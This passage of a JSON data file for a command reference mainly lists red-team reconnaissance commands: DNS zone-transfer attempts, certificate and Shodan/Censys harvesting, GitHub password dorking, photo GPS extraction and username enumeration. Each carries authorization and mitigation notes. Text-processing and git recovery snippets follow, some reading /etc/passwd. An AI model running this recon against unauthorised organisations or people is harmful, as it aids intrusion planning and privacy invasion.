 {"id":"osint-dns-mx","level":"intermediate","updated":"2026-07","cat":"OSINT","title":"Mail server (MX) discovery","desc":"Resolve MX records to identify the mail provider and gateway hosts for a domain.","danger":"Passive; enumerate only authorized domains.","team":"red","tags":["osint","dns","mail","recon"],"attack":["T1590.002"],"detect":"Invisible to target — resolved from DNS, not the victim's mail servers; no SMTP connection is made.","mitigate":"Front mail with a filtering gateway, keep internal relay names out of public MX, and enforce SPF/DKIM/DMARC to blunt spoofing that MX discovery enables.","code":{"ps":"Resolve-DnsName {{DOMAIN:example.com}} -Type MX","cmd":"nslookup -type=mx {{DOMAIN:example.com}}","mac":"dig +short MX {{DOMAIN:example.com}}","linux":"dig +short MX {{DOMAIN:example.com}}"}},
 {"id":"osint-dns-txt-spf","level":"intermediate","updated":"2026-07","cat":"OSINT","title":"SPF / DMARC / TXT records","desc":"Read TXT records including SPF and _dmarc to reveal mail policy, cloud providers, and verification tokens.","danger":"Passive; scope to authorized domains.","team":"red","tags":["osint","dns","mail","recon"],"attack":["T1590.002"],"detect":"Invisible to target — TXT records are served from DNS with no victim-side logging.","mitigate":"Remove stale verification tokens/service includes that fingerprint your SaaS stack, and keep SPF includes tight to reduce spoofing surface.","code":{"ps":"Resolve-DnsName {{DOMAIN:example.com}} -Type TXT","mac":"dig +short TXT {{DOMAIN:example.com}}; dig +short TXT _dmarc.{{DOMAIN:example.com}}","linux":"dig +short TXT {{DOMAIN:example.com}}; dig +short TXT _dmarc.{{DOMAIN:example.com}}"}},
 {"id":"osint-reverse-dns","level":"intermediate","updated":"2026-07","cat":"OSINT","title":"Reverse DNS (PTR) lookup","desc":"Resolve an IP back to its PTR hostname to map ownership and naming conventions across a netblock.","danger":"Passive; only resolve IPs within your authorized engagement scope.","team":"red","tags":["osint","dns","network","recon"],"attack":["T1590.002"],"detect":"Invisible to target — PTR lookups query the in-addr.arpa zone (often provider-hosted), not the victim host itself.","mitigate":"Avoid descriptive PTR names (e.g. host role or software), and delegate reverse zones so they don't leak internal hostnames.","code":{"ps":"Resolve-DnsName {{IP:1.1.1.1}} -Type PTR","mac":"dig +short -x {{IP:1.1.1.1}}","linux":"dig +short -x {{IP:1.1.1.1}}"}},
 {"id":"osint-dns-zone-transfer","level":"intermediate","updated":"2026-07","cat":"OSINT","title":"DNS zone transfer (AXFR) attempt","desc":"Test whether an authoritative nameserver allows a full zone transfer, dumping every record at once.","danger":"Active — connects directly to the target nameserver and is logged; run only with written authorization.","team":"red","tags":["osint","dns","enumeration","discovery"],"attack":["T1590.002"],"detect":"Visible to defender — the nameserver logs the inbound AXFR request/TCP 53 connection from your source IP; unexpected AXFR is a classic recon indicator.","mitigate":"Restrict zone transfers to authorized secondaries with allow-transfer/TSIG and deny AXFR from arbitrary hosts.","code":{"mac":"dig AXFR {{DOMAIN:example.com}} @{{NS:ns1.example.com}}","linux":"dig AXFR {{DOMAIN:example.com}} @{{NS:ns1.example.com}}"}},
 {"id":"osint-cert-transparency","level":"intermediate","updated":"2026-07","related":["osint-tls-cert-inspect","osint-dns-records"],"cat":"OSINT","title":"Subdomains from crt.sh (CT logs)","desc":"Harvest subdomains from public Certificate Transparency logs via the crt.sh JSON API — no scanning required.","danger":"Passive; use discovered hosts only within your authorized scope.","team":"red","tags":["osint","certificates","subdomain","recon"],"attack":["T1596.003"],"detect":"Invisible to target — data comes from public CT logs (Google/Cloudflare/etc.), so the victim sees no query.","mitigate":"Use wildcard certs to avoid enumerating per-host names, keep dev/staging behind private CAs, and monitor CT logs for unexpected issuance against your domains.","code":{"ps":"Invoke-RestMethod \"https://crt.sh/?q=%25.{{DOMAIN:example.com}}&output=json\" | Select-Object -Expand name_value -Unique","mac":"curl -s \"https://crt.sh/?q=%25.{{DOMAIN:example.com}}&output=json\" | python3 -c \"import sys,json;[print(n) for n in sorted({x['name_value'] for x in json.load(sys.stdin)})]\"","linux":"curl -s \"https://crt.sh/?q=%25.{{DOMAIN:example.com}}&output=json\" | python3 -c \"import sys,json;[print(n) for n in sorted({x['name_value'] for x in json.load(sys.stdin)})]\""}},
 {"id":"osint-tls-cert-inspect","level":"intermediate","updated":"2026-07","cat":"OSINT","title":"Live TLS certificate SANs","desc":"Pull the live cert's Subject Alternative Names to reveal sibling hostnames (openssl on BSD/GNU; Python ssl elsewhere).","danger":"Active — completes a TLS handshake with the target host; run only against authorized systems.","team":"red","tags":["osint","certificates","tls","recon"],"attack":["T1596.003"],"detect":"Visible to defender — the web server/load balancer logs the TLS handshake and source IP (though a single handshake blends into normal traffic).","mitigate":"Avoid packing many internal hostnames into one public cert; use separate certs or wildcards so a single fetch reveals less topology.","code":{"mac":"echo | openssl s_client -connect {{HOST:example.com}}:443 -servername {{HOST:example.com}} 2>/dev/null | openssl x509 -noout -text | grep -A1 'Subject Alternative Name'","linux":"echo | openssl s_client -connect {{HOST:example.com}}:443 -servername {{HOST:example.com}} 2>/dev/null | openssl x509 -noout -text | grep -A1 'Subject Alternative Name'","py":"import ssl,socket,json;c=ssl.create_default_context();s=c.wrap_socket(socket.socket(),server_hostname='{{HOST:example.com}}');s.connect(('{{HOST:example.com}}',443));print(json.dumps(s.getpeercert(),indent=2));s.close()"}},
 {"id":"osint-shodan-host","level":"intermediate","updated":"2026-07","cat":"OSINT","title":"Shodan host lookup","desc":"Retrieve open ports, banners, and known vulns for an IP from Shodan's index (Shodan CLI + API key).","danger":"Passive; only query assets you are authorized to assess and honor Shodan API ToS.","team":"red","tags":["osint","scanning","banner","recon"],"attack":["T1596.005"],"detect":"Invisible to target — results come from Shodan's prior scans, not a live scan you launch, so the victim sees nothing.","mitigate":"Reduce internet-exposed services, strip version banners, firewall management ports, and periodically self-check your ranges in Shodan.","code":{"ps":"shodan host {{IP:8.8.8.8}}","mac":"shodan host {{IP:8.8.8.8}}","linux":"shodan host {{IP:8.8.8.8}}"}},
 {"id":"osint-shodan-search","level":"intermediate","updated":"2026-07","cat":"OSINT","title":"Shodan search by netblock/org","desc":"Query Shodan for all indexed hosts in a CIDR or organization (Shodan CLI + API key).","danger":"Passive database query; restrict filters to authorized organizations/ranges.","team":"red","tags":["osint","scanning","discovery","recon"],"attack":["T1596.005"],"detect":"Invisible to target — the search reads Shodan's dataset; no packets reach the victim.","mitigate":"Minimize exposed attack surface, remove org tags from banners, and alert on your assets appearing in Shodan/search-engine results.","code":{"ps":"shodan search --fields ip_str,port,org \"net:{{CIDR:8.8.8.0/24}}\"","mac":"shodan search --fields ip_str,port,org \"net:{{CIDR:8.8.8.0/24}}\"","linux":"shodan search --fields ip_str,port,org \"net:{{CIDR:8.8.8.0/24}}\""}},
 {"id":"osint-censys-search","level":"intermediate","updated":"2026-07","cat":"OSINT","title":"Censys asset search","desc":"Search Censys for hosts/certs matching a domain or service fingerprint (Censys CLI + API credentials).","danger":"Passive; scope queries to authorized targets and follow Censys ToS.","team":"red","tags":["osint","certificates","discovery","recon"],"attack":["T1596.005"],"detect":"Invisible to target — Censys returns pre-collected scan/CT data; the victim receives no traffic from you.","mitigate":"Shrink external footprint, avoid reusing identifiable certificate subjects across hosts, and self-monitor your presence in Censys.","code":{"ps":"censys search \"services.tls.certificates.leaf_data.subject.common_name: {{DOMAIN:example.com}}\"","mac":"censys search \"services.tls.certificates.leaf_data.subject.common_name: {{DOMAIN:example.com}}\"","linux":"censys search \"services.tls.certificates.leaf_data.subject.common_name: {{DOMAIN:example.com}}\""}},
 {"id":"osint-theharvester","level":"intermediate","updated":"2026-07","related":["osint-hibp-breach","osint-username-enum"],"cat":"OSINT","title":"theHarvester email/subdomain harvest","desc":"Aggregate emails, subdomains, and hosts from public sources for a domain (theHarvester tool).","danger":"Mostly passive (source-dependent); run only against domains in your authorized scope.","team":"red","tags":["osint","subdomain","mail","recon"],"attack":["T1589.002"],"detect":"Invisible to target for passive sources (search engines, CT, crt.sh); the victim sees no direct queries unless a source module actively probes.","mitigate":"Limit publishing staff emails, use role addresses, and reduce the DNS/CT footprint that seeds automated harvesting.","code":{"ps":"theHarvester -d {{DOMAIN:example.com}} -b bing,crtsh,duckduckgo","mac":"theHarvester -d {{DOMAIN:example.com}} -b bing,crtsh,duckduckgo","linux":"theHarvester -d {{DOMAIN:example.com}} -b bing,crtsh,duckduckgo"}},
 {"id":"osint-exiftool-meta","level":"intermediate","updated":"2026-07","cat":"OSINT","title":"Document/image metadata extraction","desc":"Dump all embedded metadata (author, software, timestamps, device) from files with exiftool.","danger":"Passive on files already in your possession; only analyze documents you are authorized to hold.","team":"red","tags":["osint","recon","reference"],"attack":["T1592.002"],"detect":"Invisible to target — analysis happens locally on a downloaded file; the victim has no visibility into your inspection.","mitigate":"Strip metadata before publishing documents (built-in Office/PDF sanitizers or exiftool -all=) to avoid leaking usernames, software versions, and paths.","code":{"ps":"exiftool -a -u -G1 {{FILE:document.pdf}}","mac":"exiftool -a -u -G1 {{FILE:document.pdf}}","linux":"exiftool -a -u -G1 {{FILE:document.pdf}}"}},
 {"id":"osint-exif-gps","level":"intermediate","updated":"2026-07","cat":"OSINT","title":"GPS coordinates from images","desc":"Batch-extract GPS latitude/longitude embedded in photos to geolocate subjects (exiftool).","danger":"Passive local analysis; handle personal imagery only with authorization and privacy/legal care.","team":"red","tags":["osint","recon","reference"],"attack":["T1591.001"],"detect":"Invisible to target — EXIF GPS is read from files already collected; no interaction with the victim occurs.","mitigate":"Disable location tagging on cameras/phones and strip EXIF GPS before sharing images publicly.","code":{"ps":"exiftool -gpslatitude -gpslongitude -gpsposition -r {{DIR:./images}}","mac":"exiftool -gpslatitude -gpslongitude -gpsposition -r {{DIR:./images}}","linux":"exiftool -gpslatitude -gpslongitude -gpsposition -r {{DIR:./images}}"}},
 {"id":"osint-hibp-breach","level":"intermediate","updated":"2026-07","cat":"OSINT","title":"Breach exposure by domain (HIBP)","desc":"List known breaches affecting a domain via the free Have I Been Pwned breaches endpoint (account-level lookups need an API key).","danger":"Passive; query only domains within your authorized scope and follow HIBP acceptable-use terms.","team":"red","tags":["osint","password","account","recon"],"attack":["T1589.001"],"detect":"Invisible to target — the request goes to the HIBP service, not the victim; no victim-side telemetry results.","mitigate":"Enforce MFA and passwordless auth, monitor for credential reuse, and rotate credentials tied to disclosed breaches.","code":{"ps":"Invoke-RestMethod \"https://haveibeenpwned.com/api/v3/breaches?Domain={{DOMAIN:adobe.com}}\" | Select-Object Name,BreachDate,PwnCount","mac":"curl -s \"https://haveibeenpwned.com/api/v3/breaches?Domain={{DOMAIN:adobe.com}}\" | python3 -m json.tool","linux":"curl -s \"https://haveibeenpwned.com/api/v3/breaches?Domain={{DOMAIN:adobe.com}}\" | python3 -m json.tool","py":"import urllib.request,json; r=urllib.request.Request('https://haveibeenpwned.com/api/v3/breaches?Domain={{DOMAIN:adobe.com}}',headers={'User-Agent':'fieldkit'}); print(json.dumps(json.load(urllib.request.urlopen(r)),indent=2))"}},
 {"id":"osint-github-dork","level":"intermediate","updated":"2026-07","cat":"OSINT","title":"GitHub code dorking","desc":"Open GitHub code search for leaked secrets, hostnames, or keys referencing a target (browser + github.com/search).","danger":"Passive search of public repos; act only on exposures within your authorized scope and report responsibly.","team":"red","tags":["osint","git","recon"],"attack":["T1593.003"],"detect":"Invisible to target — the query runs against GitHub's index, not victim systems; the victim has no visibility.","mitigate":"Enable secret scanning/push protection, rotate any committed credentials, and use pre-commit hooks to block secrets before they reach public repos.","code":{"ps":"Start-Process \"https://github.com/search?type=code&q=%22{{DOMAIN:example.com}}%22+password\"","mac":"open \"https://github.com/search?type=code&q=%22{{DOMAIN:example.com}}%22+password\"","linux":"xdg-open \"https://github.com/search?type=code&q=%22{{DOMAIN:example.com}}%22+password\""}},
 {"id":"osint-search-dorks","level":"intermediate","updated":"2026-07","cat":"OSINT","title":"Search-engine dorking","desc":"Use advanced operators (site:, filetype:, intitle:, inurl:) to surface exposed files and pages for a target.","danger":"Passive; review only results tied to authorized targets.","team":"red","tags":["osint","web","recon"],"attack":["T1593.002"],"detect":"Invisible to target — search operators run against the engine's index; the victim receives no direct request from you.","mitigate":"Keep sensitive files out of crawlable paths, use robots/meta noindex and auth, and periodically self-dork to find exposed documents.","code":{"ps":"Start-Process \"https://www.google.com/search?q=site:{{DOMAIN:example.com}}+filetype:pdf\"","mac":"open \"https://www.google.com/search?q=site:{{DOMAIN:example.com}}+filetype:pdf\"","linux":"xdg-open \"https://www.google.com/search?q=site:{{DOMAIN:example.com}}+filetype:pdf\""}},
 {"id":"osint-wayback","level":"intermediate","updated":"2026-07","cat":"OSINT","title":"Wayback Machine URL history","desc":"Pull historical URLs for a domain from the Internet Archive CDX API to find retired endpoints and parameters.","danger":"Passive; use recovered URLs only within your authorized scope.","team":"red","tags":["osint","web","recon","discovery"],"attack":["T1596"],"detect":"Invisible to target — content is served from the Internet Archive, not the victim's live site.","mitigate":"Assume old content is permanently archived; rotate secrets that ever appeared in public pages and avoid embedding sensitive data in URLs.","code":{"ps":"Invoke-RestMethod \"http://web.archive.org/cdx/search/cdx?url={{DOMAIN:example.com}}*&output=text&fl=original&collapse=urlkey&limit=1000\"","mac":"curl -s \"http://web.archive.org/cdx/search/cdx?url={{DOMAIN:example.com}}*&output=text&fl=original&collapse=urlkey&limit=1000\"","linux":"curl -s \"http://web.archive.org/cdx/search/cdx?url={{DOMAIN:example.com}}*&output=text&fl=original&collapse=urlkey&limit=1000\""}},
 {"id":"osint-asn-lookup","level":"intermediate","updated":"2026-07","cat":"OSINT","title":"ASN / netblock mapping","desc":"Map an IP to its owning ASN and network via the Team Cymru whois service to scope an organization's ranges.","danger":"Passive; use resulting ranges only for authorized targets.","team":"red","tags":["osint","network","recon","discovery"],"attack":["T1590.005"],"detect":"Invisible to target — the lookup queries Team Cymru's whois database, not victim infrastructure.","mitigate":"Understand your announced ranges are public BGP data; segment and firewall netblocks so ASN mapping yields little exploitable detail.","code":{"mac":"whois -h whois.cymru.com \" -v {{IP:8.8.8.8}}\"","linux":"whois -h whois.cymru.com \" -v {{IP:8.8.8.8}}\""}},
 {"id":"osint-username-enum","level":"intermediate","updated":"2026-07","related":["osint-maigret","osint-holehe","osint-blackbird"],"cat":"OSINT","title":"Username enumeration across sites","desc":"Check a username's presence across social/media platforms with Sherlock (Sherlock tool).","danger":"Semi-active — probes many third-party sites; use only for authorized investigations and respect each site's ToS/privacy law.","team":"red","tags":["osint","account","recon"],"attack":["T1593.001"],"detect":"Invisible to the primary target — requests hit third-party platforms, not the victim org; individual platforms may log the profile checks.","mitigate":"Encourage distinct usernames per platform and privacy-limited profiles to reduce cross-site correlation of individuals.","code":{"ps":"sherlock {{USERNAME:johndoe}}","mac":"sherlock {{USERNAME:johndoe}}","linux":"sherlock {{USERNAME:johndoe}}"}},
 {"id":"osint-robots-sitemap","level":"intermediate","updated":"2026-07","cat":"OSINT","title":"robots.txt & sitemap harvest","desc":"Fetch robots.txt and sitemap.xml from a target site to enumerate paths the operator both hides and indexes.","danger":"Active — makes direct HTTP requests to the victim web server; run only against authorized sites.","team":"red","tags":["osint","web","enumeration","discovery"],"attack":["T1594"],"detect":"Visible to defender — the web server access log records your GET /robots.txt and /sitemap.xml with source IP and User-Agent.","mitigate":"Don't list sensitive Disallow paths in robots.txt (it advertises them); protect admin/staging with authentication rather than obscurity.","code":{"ps":"Invoke-RestMethod \"https://{{DOMAIN:example.com}}/robots.txt\"; Invoke-RestMethod \"https://{{DOMAIN:example.com}}/sitemap.xml\"","mac":"curl -s https://{{DOMAIN:example.com}}/robots.txt; curl -s https://{{DOMAIN:example.com}}/sitemap.xml","linux":"curl -s https://{{DOMAIN:example.com}}/robots.txt; curl -s https://{{DOMAIN:example.com}}/sitemap.xml"}},

/* ================= REGEX & TEXT PROCESSING ================= */
 {"id":"rgx-grep-recursive","cat":"Regex & Text Processing","title":"grep: recursive search with line numbers","desc":"Recursively search a directory tree for a regex, printing file and line number.","tags":["regex","quick-win","logs"],"code":{"linux":"grep -rn \"{{PATTERN:error}}\" {{PATH:.}}","mac":"grep -rn \"{{PATTERN:error}}\" {{PATH:.}}"}},
 {"id":"rgx-grep-extended","cat":"Regex & Text Processing","title":"grep -E: extended regex with alternation","desc":"Case-insensitive extended-regex match (egrep-style) using | alternation.","tags":["regex","logs","triage"],"code":{"linux":"grep -Ein \"{{PATTERN:error|warn|fail}}\" {{FILE:app.log}}","mac":"grep -Ein \"{{PATTERN:error|warn|fail}}\" {{FILE:app.log}}"}},
 {"id":"rgx-grep-context","cat":"Regex & Text Processing","title":"grep: show context lines around matches","desc":"Print N lines of surrounding context (-C) around each match; -A after, -B before.","tags":["regex","logs","triage"],"code":{"linux":"grep -n -C {{N:3}} \"{{PATTERN:panic}}\" {{FILE:app.log}}","mac":"grep -n -C {{N:3}} \"{{PATTERN:panic}}\" {{FILE:app.log}}"}},
 {"id":"rgx-grep-only-match","cat":"Regex & Text Processing","title":"grep -o: print only the matched text","desc":"Emit just the matched substring instead of the whole line (great for extraction).","tags":["regex","quick-win","reference"],"code":{"linux":"grep -Eo \"{{PATTERN:[0-9]+}}\" {{FILE:app.log}}","mac":"grep -Eo \"{{PATTERN:[0-9]+}}\" {{FILE:app.log}}"}},
 {"id":"rgx-grep-count-invert","cat":"Regex & Text Processing","title":"grep: count matches / invert match","desc":"Count matching lines with -c; show only NON-matching lines with -v.","tags":["regex","logs","quick-win"],"code":{"linux":"grep -c \"{{PATTERN:200}}\" {{FILE:access.log}}","mac":"grep -c \"{{PATTERN:200}}\" {{FILE:access.log}}"}},
 {"id":"rgx-extract-ipv4","cat":"Regex & Text Processing","title":"Extract IPv4 addresses from a file","desc":"Pull every IPv4-looking string out of a log or dump for triage.","tags":["regex","triage","cross-platform"],"code":{"linux":"grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}' {{FILE:app.log}} | sort -u","mac":"grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}' {{FILE:app.log}} | sort -u","ps":"Select-String -Path {{FILE:app.log}} -Pattern '(\\d{1,3}\\.){3}\\d{1,3}' -AllMatches | ForEach-Object { $_.Matches.Value } | Sort-Object -Unique","py":"python3 -c \"import re; print('\\n'.join(sorted(set(re.findall(r'(?:\\d{1,3}\\.){3}\\d{1,3}', open('{{FILE:app.log}}').read())))))\""}},
 {"id":"rgx-extract-email","cat":"Regex & Text Processing","title":"Extract email addresses","desc":"Harvest email addresses from text; case-insensitive match.","tags":["regex","osint","triage"],"code":{"linux":"grep -Eio '[a-z0-9._%+-]+@[a-z0-9.-]+\\.[a-z]{2,}' {{FILE:dump.txt}} | sort -u","mac":"grep -Eio '[a-z0-9._%+-]+@[a-z0-9.-]+\\.[a-z]{2,}' {{FILE:dump.txt}} | sort -u","py":"python3 -c \"import re; print('\\n'.join(sorted(set(re.findall(r'[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}', open('{{FILE:dump.txt}}').read())))))\""}},
 {"id":"rgx-extract-hash","cat":"Regex & Text Processing","title":"Extract hex hashes (MD5/SHA1/SHA256)","desc":"Grab hex hash strings by length: 32=MD5, 40=SHA1, 64=SHA256 (change {32}).","tags":["regex","forensics","triage"],"code":{"linux":"grep -Eio '\\b[a-f0-9]{32}\\b' {{FILE:hashes.txt}} | sort -u","mac":"grep -Eio '\\b[a-f0-9]{32}\\b' {{FILE:hashes.txt}} | sort -u","py":"python3 -c \"import re; print('\\n'.join(sorted(set(re.findall(r'\\b[a-fA-F0-9]{32}\\b', open('{{FILE:hashes.txt}}').read())))))\""}},
 {"id":"rgx-sed-substitute","cat":"Regex & Text Processing","title":"sed: stream substitution","desc":"Substitute all matches of a regex and print to stdout (does not modify the file).","tags":["regex","automation","quick-win"],"code":{"linux":"sed 's/{{OLD:foo}}/{{NEW:bar}}/g' {{FILE:file.txt}}","mac":"sed 's/{{OLD:foo}}/{{NEW:bar}}/g' {{FILE:file.txt}}"}},
 {"id":"rgx-sed-inplace","cat":"Regex & Text Processing","title":"sed: edit file in place (GNU vs BSD)","desc":"Rewrite the file on disk. GNU takes -i; BSD/macOS requires an empty backup arg: -i ''.","danger":"Overwrites the file in place with no undo. Test the substitution to stdout first, or pass a backup suffix (e.g. -i.bak).","tags":["regex","automation"],"code":{"linux":"sed -i 's/{{OLD:foo}}/{{NEW:bar}}/g' {{FILE:file.txt}}","mac":"sed -i '' 's/{{OLD:foo}}/{{NEW:bar}}/g' {{FILE:file.txt}}"}},
 {"id":"rgx-sed-delete-lines","cat":"Regex & Text Processing","title":"sed: delete lines matching a pattern","desc":"Print the stream with matching lines removed; here strips comment lines starting with #.","tags":["regex","automation","quick-win"],"code":{"linux":"sed '/{{PATTERN:^#}}/d' {{FILE:config.conf}}","mac":"sed '/{{PATTERN:^#}}/d' {{FILE:config.conf}}"}},
 {"id":"rgx-sed-print-range","cat":"Regex & Text Processing","title":"sed: print a specific line range","desc":"Extract lines START through END with sed -n (quiet) and the p command.","tags":["regex","logs","quick-win"],"code":{"linux":"sed -n '{{START:10}},{{END:20}}p' {{FILE:app.log}}","mac":"sed -n '{{START:10}},{{END:20}}p' {{FILE:app.log}}"}},
 {"id":"rgx-awk-columns","cat":"Regex & Text Processing","title":"awk: print selected fields","desc":"Print whitespace-delimited columns by index ($1, $7); $0 is the whole line.","tags":["regex","logs","reference"],"code":{"linux":"awk '{print $1, $7}' {{FILE:access.log}}","mac":"awk '{print $1, $7}' {{FILE:access.log}}"}},
 {"id":"rgx-awk-filter","cat":"Regex & Text Processing","title":"awk: filter rows by a field condition","desc":"Set a field separator with -F and print rows matching a numeric/text condition. Note: on macOS /etc/passwd holds only system accounts; regular users live in Directory Services.","tags":["regex","enumeration","reference"],"code":{"linux":"awk -F: '$3 >= 1000 {print $1}' /etc/passwd","mac":"awk -F: '$3 >= 1000 {print $1}' /etc/passwd"}},
 {"id":"rgx-awk-sum","cat":"Regex & Text Processing","title":"awk: sum or average a column","desc":"Accumulate a numeric field across all lines and print the total in an END block.","tags":["regex","reference","quick-win"],"code":{"linux":"awk '{sum += $1} END {print sum}' {{FILE:nums.txt}}","mac":"awk '{sum += $1} END {print sum}' {{FILE:nums.txt}}"}},
 {"id":"rgx-cut-fields","cat":"Regex & Text Processing","title":"cut: extract columns by delimiter","desc":"Split each line on a delimiter (-d) and keep selected fields (-f); fast for CSV/passwd.","tags":["regex","quick-win","reference"],"code":{"linux":"cut -d: -f1,7 /etc/passwd","mac":"cut -d: -f1,7 /etc/passwd"}},
 {"id":"rgx-sort-uniq-count","cat":"Regex & Text Processing","title":"sort | uniq -c: rank duplicate lines","desc":"Classic top-talkers pipeline: count each unique line and sort by frequency descending.","tags":["logs","triage","quick-win"],"code":{"linux":"sort {{FILE:ips.txt}} | uniq -c | sort -rn | head","mac":"sort {{FILE:ips.txt}} | uniq -c | sort -rn | head","ps":"Get-Content {{FILE:ips.txt}} | Group-Object | Sort-Object Count -Descending | Select-Object Count, Name -First 10"}},
 {"id":"rgx-tr-translate","cat":"Regex & Text Processing","title":"tr: translate, delete, or squeeze characters","desc":"Map or strip character sets; example lowercases text (tr -d deletes, tr -s squeezes runs).","tags":["regex","quick-win","reference"],"code":{"linux":"tr '[:upper:]' '[:lower:]' < {{FILE:file.txt}}","mac":"tr '[:upper:]' '[:lower:]' < {{FILE:file.txt}}"}},
 {"id":"rgx-jq-filter","cat":"Regex & Text Processing","title":"jq: filter and extract JSON fields","desc":"Query JSON with jq (install: not default). -r emits raw strings; select() filters objects.","tags":["regex","quick-win","reference"],"code":{"linux":"jq -r '.[] | select(.{{FIELD:status}}=={{VALUE:500}}) | .{{OUT:url}}' {{FILE:data.json}}","mac":"jq -r '.[] | select(.{{FIELD:status}}=={{VALUE:500}}) | .{{OUT:url}}' {{FILE:data.json}}"}},
 {"id":"rgx-json-pretty","cat":"Regex & Text Processing","title":"Pretty-print / validate JSON without jq","desc":"Format and validate JSON using only stdlib (Python json.tool) or PowerShell ConvertFrom-Json.","tags":["quick-win","reference","cross-platform"],"code":{"py":"python3 -m json.tool {{FILE:data.json}}","ps":"Get-Content {{FILE:data.json}} -Raw | ConvertFrom-Json | ConvertTo-Json -Depth 10"}},
 {"id":"rgx-select-string","cat":"Regex & Text Processing","title":"Select-String: grep for PowerShell","desc":"Regex-search files in PowerShell; -Context adds surrounding lines, -AllMatches finds every hit.","tags":["regex","windows","logs"],"code":{"ps":"Select-String -Path {{GLOB:.\\*.log}} -Pattern '{{PATTERN:error}}' -Context 0,2"}},
 {"id":"rgx-ps-replace","cat":"Regex & Text Processing","title":"PowerShell -replace: regex substitution","desc":"Regex replace across a file's contents; write back with Set-Content to modify on disk.","danger":"The Set-Content step overwrites the source file. Preview without Set-Content first to confirm the replacement.","tags":["regex","windows","automation"],"code":{"ps":"(Get-Content {{FILE:file.txt}} -Raw) -replace '{{OLD:foo}}','{{NEW:bar}}' | Set-Content {{FILE:file.txt}}"}},
 {"id":"rgx-findstr","cat":"Regex & Text Processing","title":"findstr: native Windows text search","desc":"Search files without grep; /S recurses, /I ignores case, /N numbers lines, /R enables regex.","tags":["regex","windows","quick-win"],"code":{"cmd":"findstr /S /I /N \"{{PATTERN:error}}\" {{GLOB:*.log}}"}},
 {"id":"rgx-wc-count","cat":"Regex & Text Processing","title":"Count lines, words, and bytes","desc":"Tally line/word/byte counts (wc -l/-w/-c); PowerShell uses Measure-Object.","tags":["quick-win","reference","cross-platform"],"code":{"linux":"wc -l {{FILE:app.log}}","mac":"wc -l {{FILE:app.log}}","ps":"(Get-Content {{FILE:app.log}} | Measure-Object -Line).Lines"}},

/* ================= GIT RECOVERY ================= */
 {"id":"gitr-reflog","related":["gitr-undo-hard-reset","gitr-recover-deleted-branch","gitr-rescue-dangling-commit"],"cat":"Git Recovery","title":"View the reflog to find lost commits","desc":"Show every position HEAD has held so you can locate commits lost to reset, rebase, or amend. Time refs like main@{yesterday} also work.","tags":["git","recovery","quick-win"],"code":{"ps":"git reflog\ngit reflog --date=iso -20","cmd":"git reflog\ngit reflog --date=iso -20","mac":"git reflog\ngit reflog --date=iso -20","linux":"git reflog\ngit reflog --date=iso -20"}},
 {"id":"gitr-reflog-branch","cat":"Git Recovery","title":"Reflog for a specific branch/ref","desc":"Show the movement history of one branch or ref (not just HEAD) to find a tip you moved or lost.","tags":["git","recovery"],"code":{"ps":"git reflog show {{REF:main}}","cmd":"git reflog show {{REF:main}}","mac":"git reflog show {{REF:main}}","linux":"git reflog show {{REF:main}}"}},
 {"id":"gitr-undo-hard-reset","related":["gitr-orig-head","gitr-reflog"],"cat":"Git Recovery","title":"Undo a git reset --hard","desc":"Recover work thrown away by 'git reset --hard' by re-pointing HEAD at the pre-reset commit shown in the reflog.","danger":"Overwrites the working tree and index. Commit or stash any current changes first.","tags":["git","recovery","quick-win"],"code":{"ps":"git reflog\ngit reset --hard \"HEAD@{1}\"","cmd":"git reflog\ngit reset --hard HEAD@{1}","mac":"git reflog\ngit reset --hard HEAD@{1}","linux":"git reflog\ngit reset --hard HEAD@{1}"}},
 {"id":"gitr-recover-deleted-branch","related":["gitr-reflog-branch"],"cat":"Git Recovery","title":"Recover a deleted branch","desc":"Recreate a branch removed with 'git branch -D' by finding its last commit in the reflog and pointing a new branch at that SHA.","tags":["git","recovery"],"code":{"ps":"git reflog\ngit branch {{BRANCH:feature}} {{SHA:a1b2c3d}}","cmd":"git reflog\ngit branch {{BRANCH:feature}} {{SHA:a1b2c3d}}","mac":"git reflog\ngit branch {{BRANCH:feature}} {{SHA:a1b2c3d}}","linux":"git reflog\ngit branch {{BRANCH:feature}} {{SHA:a1b2c3d}}"}},
 {"id":"gitr-restore-file","cat":"Git Recovery","title":"Discard edits and restore a file","desc":"Return one file to its last committed state, discarding uncommitted edits. Older git: 'git checkout -- FILE'.","danger":"Permanently discards your uncommitted changes to that file — they are not recoverable.","tags":["git","recovery","quick-win"],"code":{"ps":"git restore {{FILE:path/to/file}}","cmd":"git restore {{FILE:path/to/file}}","mac":"git restore {{FILE:path/to/file}}","linux":"git restore {{FILE:path/to/file}}"}},
 {"id":"gitr-restore-all","cat":"Git Recovery","title":"Discard all working-tree changes","desc":"Reset the whole working tree back to the last commit. Older git: 'git checkout -- .'.","danger":"Permanently discards ALL uncommitted changes. Uncommitted, unstaged work cannot be recovered afterward.","tags":["git","recovery"],"code":{"ps":"git restore :/","cmd":"git restore :/","mac":"git restore :/","linux":"git restore :/"}},
 {"id":"gitr-unstage","cat":"Git Recovery","title":"Unstage a file (undo git add)","desc":"Remove a file from the staging area while keeping your edits intact. Older git: 'git reset HEAD FILE'.","tags":["git","recovery","quick-win"],"code":{"ps":"git restore --staged {{FILE:path/to/file}}","cmd":"git restore --staged {{FILE:path/to/file}}","mac":"git restore --staged {{FILE:path/to/file}}","linux":"git restore --staged {{FILE:path/to/file}}"}},
 {"id":"gitr-restore-from-commit","cat":"Git Recovery","title":"Restore a file from another commit","desc":"Overwrite a file in your working tree with its version from a specific commit or branch.","danger":"Overwrites the current working copy of that file with the older version.","tags":["git","recovery"],"code":{"ps":"git restore --source {{REF:HEAD~1}} -- {{FILE:path/to/file}}","cmd":"git restore --source {{REF:HEAD~1}} -- {{FILE:path/to/file}}","mac":"git restore --source {{REF:HEAD~1}} -- {{FILE:path/to/file}}","linux":"git restore --source {{REF:HEAD~1}} -- {{FILE:path/to/file}}"}},
